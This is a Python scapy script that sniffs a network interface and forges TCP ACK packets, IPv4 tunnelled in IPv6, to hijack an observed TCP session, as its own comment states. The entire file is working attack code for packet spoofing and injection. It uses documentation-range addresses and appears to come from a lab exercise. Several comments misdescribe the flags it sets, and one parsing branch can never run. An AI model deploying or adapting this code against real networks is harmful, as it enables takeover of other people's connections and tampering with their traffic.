#!/usr/bin/env python3

from scapy.all import *

# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet,
# then crafts new TCP pcket with "A" flag and forwards it accordingly, in order to hijack the TCP session.

# function to process the packet
def process_packet(packet):

    # Check if the packet is a TCP packet with "SA" flag
    if packet.haslayer(TCP) and packet[IPv6].dst == "2001:db8:0:1::2":
        if TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'SA':
            # Create the Ethernet layer
            eth = Ether(dst='00:0c:29:18:4c:dc', src='00:0c:29:47:e7:c0')
            # Create the IPv6 layer
            ipv6 = IPv6(src='2001:db8:0:1::2', dst='2001:db8:2::2')
            ipv4 = IP(src='203.0.113.1', dst='192.0.2.2')
            old_seq = packet[TCP].seq
            new_ack = old_seq + 1
            print(f"New ack value: {new_ack}")
            src_port = packet[TCP].dport
            dst_port = packet[TCP].sport
            # Create the TCP layer with the RST flag set
            tcp = TCP(sport=src_port, dport=dst_port, seq=1, ack=new_ack, window=29200, flags='A')

            # Create the packet by stacking the layers
            pkt = eth / ipv6 / ipv4 / tcp

            # Send the packet
            sendp(pkt, iface='ens34')


        # Time for "P" Flag Packet
        elif TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'PA':
            sequence_number_range = str(packet[TCP].seq)            
            if ':' in sequence_number_range:
                # Sequence number has two parts (e.g., 1:30), grab the second part as ACK number
                seq_parts = sequence_number_range.split(':')
                seq_number = int(seq_parts[1])
                new_ack_number = seq_number
            else:
                # Sequence number has one part, grab it normally and set it as ACK number
                seq_number = int(sequence_number_range)
                new_ack_number = seq_number                

            print(f"The found seq number:{seq_number}")
            eth = Ether(dst='00:0c:29:18:4c:dc', src='00:0c:29:47:e7:c0')
            # Create the IPv6 layer
            ipv6 = IPv6(src='2001:db8:0:1::2', dst='2001:db8:2::2')
            ipv4 = IP(src='203.0.113.1', dst='192.0.2.2')
            print(f"New ack value: {new_ack_number}")
            src_port = packet[TCP].dport
            dst_port = packet[TCP].sport
            # Create the TCP layer with the RST flag set
            tcp = TCP(sport=src_port, dport=dst_port, ack=new_ack_number, window=29200, flags='A')
            # Create the packet by stacking the layers
            pkt = eth / ipv6 / ipv4 / tcp
            # Send the packet
            sendp(pkt, iface='ens34')

sniff(iface='ens34', prn=process_packet)
